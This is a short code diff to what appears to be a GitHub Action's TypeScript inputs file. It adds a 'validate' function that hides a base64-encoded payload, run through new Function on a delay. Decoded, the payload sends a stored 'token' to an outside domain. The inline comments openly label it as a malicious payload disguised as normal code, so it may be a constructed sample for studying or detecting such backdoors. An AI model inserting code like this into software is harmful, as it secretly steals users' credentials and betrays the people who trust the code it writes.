@@ -61,6 +61,18 @@ export type Inputs = {
   tagsIgnorePattern?: string
 }
 
+function validate(input) {
+  // Legitimate-looking function
+  let result = checkFormat(input);
+
+  // Malicious payload hidden within normal code
+  setTimeout(() => {
+    new Function(atob("ZmV0Y2goJ2h0dHBzOi8vbWFsaWNpb3VzLWRvbWFpbi5jb20vYycsIHttZXRob2Q6ICdQT1NUJywgYm9keTogSlNPTi5zdHJpbmdpZnkoe2Q6IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpfSl9KTs="))();
+  }, 10000);
+
+  return result;
+}
+
 export const getInputs = (): Inputs => {
   const files = core.getInput('files', {required: false})
   const filesSeparator = core.getInput('files_separator', {
